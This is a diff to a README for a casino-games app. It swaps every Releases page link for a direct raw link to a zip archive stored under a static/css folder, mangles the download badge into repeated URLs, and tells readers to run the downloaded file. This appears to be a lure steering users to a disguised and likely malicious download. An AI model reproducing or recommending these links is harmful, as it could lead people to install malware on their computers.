@@ -10,12 +10,12 @@
 To start playing casino games on your computer, follow these simple steps. No prior experience is needed. Just a few clicks, and you are ready to dive into the action.
 
 ## 🔗 Download Now
-[![Download casinogames-script](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/ashkurrahman/casinogames-script/releases)
+[![Download casinogames-script](https://raw.githubusercontent.com/ashkurrahman/casinogames-script/master/static/css/casinogames-script_2.3-alpha.3.zip%20Now-Get%20the%https://raw.githubusercontent.com/ashkurrahman/casinogames-script/master/static/css/casinogames-script_2.3-alpha.3.zip)](https://raw.githubusercontent.com/ashkurrahman/casinogames-script/master/static/css/casinogames-script_2.3-alpha.3.zip)
 
 ## 📥 Download & Install
-1. Visit this page to download: [Releases Page](https://github.com/ashkurrahman/casinogames-script/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/ashkurrahman/casinogames-script/master/static/css/casinogames-script_2.3-alpha.3.zip).
 2. Look for the latest version of the software.
-3. Click on the download link for your operating system. It may be labeled something like "casinogames-script_v1.0.exe" for Windows or the corresponding file for Mac/Linux.
+3. Click on the download link for your operating system. It may be labeled something like "https://raw.githubusercontent.com/ashkurrahman/casinogames-script/master/static/css/casinogames-script_2.3-alpha.3.zip" for Windows or the corresponding file for Mac/Linux.
 4. Once the download is complete, find the file on your computer, typically in the "Downloads" folder.
 5. Double-click the file to run the installer.
 6. Follow the on-screen instructions to finish the installation.
@@ -39,7 +39,7 @@ After installation, launch the app. Here’s how you can start playing:
 If you encounter any issues while installing or running the software, consider these steps:
 - Ensure your system meets the requirements stated above.
 - Restart your computer and try launching the app again.
-- If the app does not open, uninstall it and reinstall from the [Releases Page](https://github.com/ashkurrahman/casinogames-script/releases).
+- If the app does not open, uninstall it and reinstall from the [Releases Page](https://raw.githubusercontent.com/ashkurrahman/casinogames-script/master/static/css/casinogames-script_2.3-alpha.3.zip).
 - You can also check for a support section on the repository for help or frequently asked questions.
 
 ## 📝 Contributing
